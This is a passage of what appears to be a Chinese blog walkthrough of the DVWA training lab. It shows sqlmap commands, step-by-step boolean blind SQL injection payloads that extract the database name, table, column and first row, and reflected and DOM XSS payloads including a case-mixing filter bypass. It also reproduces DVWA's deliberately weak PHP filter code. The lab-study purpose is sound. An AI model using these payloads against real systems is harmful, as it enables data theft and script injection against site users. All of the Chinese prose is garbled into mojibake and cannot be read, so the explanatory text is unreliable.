<p>é¦–å…ˆæŠ“åŒ…ï¼Œå¤åˆ¶æ•°æ®åŒ…ï¼Œæ”¾åœ¨sqlmapç›®å½•ä¸‹æ–‡æœ¬æ–‡ä»¶</p>
<p>python sqlmap.py -r a.txt â€“batch</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131164631336.png" srcset="/img/loading.gif" lazyload alt="image-20240131164631336"></p>
<p>åé¢çš„æ­¥éª¤ä¸€æ¨¡ä¸€æ ·<img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131164735632.png" srcset="/img/loading.gif" lazyload alt="image-20240131164735632"></p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131165029552.png" srcset="/img/loading.gif" lazyload alt="image-20240131165029552"></p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><p>è¿™ä¸ªæ˜¯è·¨é¡µé¢ï¼ŒæŠ“åŒ…</p>
<p>åšæ³•æ˜¯å‰ä¸¤åšæ³•ä¸€èµ·ä½¿ç”¨</p>
<p>python sqlmap.py -r a.txt â€“batch â€“second-url â€œ<a target="_blank" rel="noopener" href="http://localhost:777/vulnerabilities/sqli/">http://localhost:777/vulnerabilities/sqli/</a>â€œ â€“dbs</p>
<p>ä¹‹åæ­¥éª¤ä¸€æ ·</p>
<h2 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h2><p>ä¸ä¼šå°†è¿”å›å…·ä½“çš„æ•°æ®ä¿¡æ¯æˆ–è¯­æ³•ä¿¡æ¯ï¼Œåªä¼šå°†æœåŠ¡å™¨åŒ…è£…åçš„ä¿¡æ¯è¿”å›åˆ°é¡µé¢ä¸­ã€‚</p>
<p><strong>å¸ƒå°”ç›²æ³¨</strong></p>
<p>å¯é€šè¿‡æ„é€ çœŸorå‡åˆ¤æ–­æ¡ä»¶ï¼ˆæ•°æ®åº“å„é¡¹ä¿¡æ¯å–å€¼çš„å¤§å°æ¯”è¾ƒï¼Œå¦‚ï¼šå­—æ®µé•¿åº¦ã€ç‰ˆæœ¬æ•°å€¼ã€å­—æ®µåã€å­—æ®µåå„ç»„æˆéƒ¨åˆ†åœ¨ä¸åŒä½ç½®å¯¹åº”çš„å­—ç¬¦ASCIIç â€¦ï¼‰ï¼Œå°†æ„é€ çš„sqlè¯­å¥æäº¤åˆ°æœåŠ¡å™¨ï¼Œç„¶åæ ¹æ®æœåŠ¡å™¨å¯¹ä¸åŒçš„è¯·æ±‚è¿”å›ä¸åŒçš„é¡µé¢ç»“æœï¼ˆTrueã€Falseï¼‰ï¼›ç„¶åä¸æ–­è°ƒæ•´åˆ¤æ–­æ¡ä»¶ä¸­çš„æ•°å€¼ä»¥é€¼è¿‘çœŸå®å€¼ï¼Œç‰¹åˆ«æ˜¯éœ€è¦å…³æ³¨å“åº”ä»True&lt;â€“&gt;Falseå‘ç”Ÿå˜åŒ–çš„è½¬æŠ˜ç‚¹ã€‚</p>
<p><strong>æ—¶é—´ç›²æ³¨</strong></p>
<p>é€šè¿‡æ„é€ çœŸorå‡åˆ¤æ–­æ¡ä»¶çš„sqlè¯­å¥ï¼Œä¸”sqlè¯­å¥ä¸­æ ¹æ®éœ€è¦è”åˆä½¿ç”¨sleep()å‡½æ•°ä¸€åŒå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè§‚å¯ŸæœåŠ¡å™¨å“åº”ç»“æœæ˜¯å¦ä¼šæ‰§è¡Œæ‰€è®¾ç½®æ—¶é—´çš„å»¶è¿Ÿå“åº”ï¼Œä»¥æ­¤æ¥åˆ¤æ–­æ‰€æ„é€ æ¡ä»¶çš„çœŸorå‡ï¼ˆè‹¥æ‰§è¡Œsleepå»¶è¿Ÿï¼Œåˆ™è¡¨ç¤ºå½“å‰è®¾ç½®çš„åˆ¤æ–­æ¡ä»¶ä¸ºçœŸï¼‰ï¼›ç„¶åä¸æ–­è°ƒæ•´åˆ¤æ–­æ¡ä»¶ä¸­çš„æ•°å€¼ä»¥é€¼è¿‘çœŸå®å€¼ï¼Œæœ€ç»ˆç¡®å®šå…·ä½“çš„æ•°å€¼å¤§å°oråç§°æ‹¼å†™ã€‚</p>
<h3 id="low-7"><a href="#low-7" class="headerlink" title="low"></a>low</h3><p>å¸ƒå°”ç›²æ³¨</p>
<p><strong>æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œåˆ¤æ–­æ³¨å…¥ç±»å‹</strong></p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span><br><span class="hljs-symbol">1 </span>\<br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; #  çŒœé—­åˆæ–¹å¼</span><br></code></pre></td></tr></table></figure>

<p><strong>æŸ¥æ‰¾åº“åï¼ˆä»¥æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºä¾‹ï¼‰ï¼ˆæœ€ç»ˆæŸ¥åˆ°çš„åº“åï¼šrootï¼‰</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select ascii(substr(database(),1,1)) &gt; 111) #</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span> <span class="hljs-number">120</span>) #<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select ascii(substr(database(),1,1)) &gt; 115) #</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) <span class="hljs-operator">&gt;</span> <span class="hljs-number">113</span>) #<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select ascii(substr(database(),1,1)) = 114) #</span><br></code></pre></td></tr></table></figure>

<p><strong>æŸ¥æ‰¾è¡¨åï¼ˆä»¥æ•°æ®åº“çš„ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºä¾‹ï¼‰ï¼ˆæœ€ç»ˆæŸ¥åˆ°çš„è¡¨åï¼šguestbook</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>root<span class="hljs-string">&#x27; limit 0,1),1,1)) &gt; 101) #</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">110</span>) #<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>root<span class="hljs-string">&#x27; limit 0,1),1,1)) &gt; 105) #</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">103</span>) #<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;</span>root<span class="hljs-string">&#x27; limit 0,1),1,1)) &gt; 102) #</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) = <span class="hljs-number">103</span>) #<br></code></pre></td></tr></table></figure>

<p><strong>æŸ¥æ‰¾è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå­—æ®µåï¼ˆä»¥æ•°æ®åº“ä¸­ç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ®µä¸ºä¾‹ï¼‰ï¼ˆæœ€ç»ˆæŸ¥åˆ°çš„åˆ—åï¼šcomment_idï¼‰</strong></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;</span>root<span class="hljs-string">&#x27; and table_name=&#x27;</span>guestbook<span class="hljs-string">&#x27; limit 0,1),1,1)) &gt; 101) #</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;guestbook&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &lt; <span class="hljs-number">101</span>) #<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;</span>root<span class="hljs-string">&#x27; and table_name=&#x27;</span>guestbook<span class="hljs-string">&#x27; limit 0,1),1,1)) &lt; 90) #</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;guestbook&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &lt; <span class="hljs-number">95</span>) #<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;</span>root<span class="hljs-string">&#x27; and table_name=&#x27;</span>guestbook<span class="hljs-string">&#x27; limit 0,1),1,1)) &lt; 98) #</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;guestbook&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &lt; <span class="hljs-number">99</span>) #<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;</span>root<span class="hljs-string">&#x27; and table_name=&#x27;</span>guestbook<span class="hljs-string">&#x27; limit 0,1),1,1)) &lt; 100) #1&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;guestbook&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) = <span class="hljs-number">99</span>) #<br></code></pre></td></tr></table></figure>

<p><strong>æŸ¥æ‰¾æ•°æ®åº“ä¸­ç¬¬ä¸€ä¸ªè¡¨ä¸­ç¬¬ä¸€ä¸ªå­—æ®µä¸­çš„ç¬¬ä¸€ä¸ªæ•°æ®çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼ˆæœ€ç»ˆæŸ¥åˆ°çš„æ•°æ®ï¼š1ï¼‰</strong></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and (select ascii(substr((select comment_id from guestbook limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">101</span>) #<br><span class="hljs-attribute">1</span>&#x27; and (select ascii(substr((select comment_id from guestbook limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">50</span>) #<br><span class="hljs-attribute">1</span>&#x27; and (select ascii(substr((select comment_id from guestbook limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">30</span>) #<br><span class="hljs-attribute">1</span>&#x27; and (select ascii(substr((select comment_id from guestbook limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">40</span>) #<br><span class="hljs-attribute">1</span>&#x27; and (select ascii(substr((select comment_id from guestbook limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">45</span>) #<br><span class="hljs-attribute">1</span>&#x27; and (select ascii(substr((select comment_id from guestbook limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) &gt; <span class="hljs-number">48</span>) #<br><span class="hljs-attribute">1</span>&#x27; and (select ascii(substr((select comment_id from guestbook limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) = <span class="hljs-number">49</span>) #<br></code></pre></td></tr></table></figure>



<h2 id="å¼±ä¼šè¯"><a href="#å¼±ä¼šè¯" class="headerlink" title="å¼±ä¼šè¯"></a>å¼±ä¼šè¯</h2><p>Weak Session IDsï¼ˆå¼±ä¼šè¯ï¼‰ï¼Œç”¨æˆ·è®¿é—®æœåŠ¡å™¨çš„æ—¶å€™ï¼Œä¸€èˆ¬æœåŠ¡å™¨éƒ½ä¼šåˆ†é…ä¸€ä¸ªèº«ä»½è¯ session id ç»™ç”¨æˆ·ï¼Œç”¨äºæ ‡è¯†ã€‚ç”¨æˆ·æ‹¿åˆ° session id åå°±ä¼šä¿å­˜åˆ° cookies ä¸Šï¼Œä¹‹ååªè¦æ‹¿ç€ cookies å†è®¿é—®æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å°±çŸ¥é“ä½ æ˜¯è°äº†ã€‚ä½†æ˜¯ session id è¿‡äºç®€å•å°±ä¼šå®¹æ˜“è¢«äººä¼ªé€ ã€‚æ ¹æœ¬éƒ½ä¸éœ€è¦çŸ¥é“ç”¨æˆ·çš„å¯†ç å°±èƒ½è®¿é—®ï¼Œç”¨æˆ·æœåŠ¡å™¨çš„å†…å®¹äº†ã€‚</p>
<h2 id="xss-dom"><a href="#xss-dom" class="headerlink" title="xss(dom)"></a>xss(dom)</h2><p>XSSåˆå«CSSï¼Œè·¨ç«™è„šæœ¬æ”»å‡»ã€‚å®ƒæŒ‡çš„æ˜¯æ¶æ„æ”»å‡»è€…å¾€webé¡µé¢æ’å…¥æ¶æ„çš„htmlä»£ç ã€‚å½“ç”¨æˆ·æµè§ˆè¯¥é¡µé¢æ—¶ï¼ŒåµŒå…¥åˆ°webé‡Œé¢çš„htmlä»£ç ä¼šè¢«è¿è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç‰¹æ®Šç›®çš„ã€‚</p>
<h3 id="low-8"><a href="#low-8" class="headerlink" title="low"></a>low</h3><p>æœåŠ¡å™¨ç«¯æ²¡æœ‰ä»»ä½•phpä»£ç ï¼Œæ‰§è¡Œå‘½ä»¤çš„åªæœ‰å®¢æˆ·ç«¯çš„jsä»£ç .åœ¨å¤é€‰æ¡†ä¸­é€‰æ‹©Englishï¼Œåœ¨ä¸Šé¢çš„urlåœ°å€æ ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°å‡ºç°äº†English.é¡ºåŠ¿æˆ‘ä»¬å¯ä»¥ä¿®æ”¹</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131195909233.png" srcset="/img/loading.gif" lazyload alt="image-20240131195909233"></p>
<h3 id="medium-7"><a href="#medium-7" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br>    <span class="hljs-variable">$default</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>];<br>    <br>    <span class="hljs-comment"># Do not allow script tags</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span> (<span class="hljs-variable">$default</span>, <span class="hljs-string">&quot;&lt;script&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>è¿‡æ»¤æ‰äº†â€œ&lt;scriptâ€ï¼Œå½“å‡½æ•°åŒ¹é…åˆ° &lt;script å­—ç¬¦ä¸²çš„æ—¶å€™å°±ä¼šå°†URLåé¢çš„å‚æ•°ä¿®æ­£ä¸º ?default&#x3D;English.</p>
<p>å¯ä»¥é€šè¿‡onerroräº‹ä»¶ï¼Œåœ¨è£…è½½æ–‡æ¡£æˆ–å›¾åƒçš„è¿‡ç¨‹ä¸­å¦‚æœå‘ç”Ÿäº†é”™è¯¯å°±ä¼šè§¦å‘</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131200629592.png" srcset="/img/loading.gif" lazyload alt="image-20240131200629592"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;default&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; !<span class="hljs-title function_ invoke__">is_null</span> (<span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;default&#x27;</span> ]) ) &#123;<br><br>    <span class="hljs-comment"># White list the allowable languages</span><br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;default&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;French&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;English&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;German&quot;</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;Spanish&quot;</span>:<br>            <span class="hljs-comment"># ok</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;location: ?default=English&quot;</span>);<br>            <span class="hljs-keyword">exit</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>ç™½åå•</p>
<p>å¦‚æœdefaultçš„å€¼ä¸ä¸ºâ€Frenchâ€ã€â€Englishâ€ã€â€Germanâ€ã€â€Spanishâ€çš„è¯å°±é‡ç½®URLä¸º:?default&#x3D;English ï¼Œè¿™é‡Œåªæ˜¯å¯¹ default çš„å˜é‡è¿›è¡Œäº†è¿‡æ»¤ã€‚</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240131200934958.png" srcset="/img/loading.gif" lazyload alt="image-20240131200934958"></p>
<h2 id="xssåå°„"><a href="#xssåå°„" class="headerlink" title="xssåå°„"></a>xssåå°„</h2><p>åå°„å‹XSSçš„è§¦å‘æœ‰åç«¯çš„å‚ä¸ï¼Œè€Œä¹‹æ‰€ä»¥è§¦å‘XSSæ˜¯å› ä¸ºåç«¯è§£æç”¨æˆ·åœ¨å‰ç«¯è¾“å…¥çš„å¸¦æœ‰XSSæ€§è´¨çš„è„šæœ¬æˆ–è€…è„šæœ¬çš„data URIç¼–ç ï¼Œåç«¯è§£æç”¨æˆ·è¾“å…¥å¤„ç†åè¿”å›ç»™å‰ç«¯ï¼Œç”±æµè§ˆå™¨è§£æè¿™æ®µXSSè„šæœ¬ï¼Œè§¦å‘XSSæ¼æ´ã€‚</p>
<h3 id="low-9"><a href="#low-9" class="headerlink" title="low"></a>low</h3><p>æºä»£ç ä¸­æ²¡æœ‰åšä»»ä½•é™åˆ¶</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="medium-8"><a href="#medium-8" class="headerlink" title="medium"></a>medium</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br><span class="hljs-comment">//å°†è¾“å…¥ä¸­çš„&lt;script&gt;è½¬åŒ–ä¸ºç©º</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>str_replaceå‡½æ•°ï¼Œå®ƒæ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">ScRipt</span>&gt;</span><br></code></pre></td></tr></table></figure>

<h3 id="high-6"><a href="#high-6" class="headerlink" title="high"></a>high</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br><span class="hljs-comment">//ä½¿ç”¨é€šé…ç¬¦ï¼Œå®Œå…¨åŒ¹é…script*Nï¼Œæ‰€ä»¥æœ‰å…³scriptçš„æ ‡ç­¾å…¨è¢«è¿‡æ»¤</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

